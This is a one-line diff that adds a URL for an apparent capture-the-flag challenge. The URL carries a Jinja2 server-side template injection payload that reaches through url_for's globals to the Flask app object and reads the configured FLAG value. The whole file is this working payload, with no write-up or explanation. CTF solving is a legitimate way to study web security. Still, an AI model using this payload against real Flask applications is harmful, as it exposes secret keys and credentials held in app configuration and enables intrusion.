@@ -1,0 +1,1 @@
+http://shrine.chal.ctf.westerns.tokyo/shrine/{{ url_for.__globals__['current_app'].config['FLAG'] }}
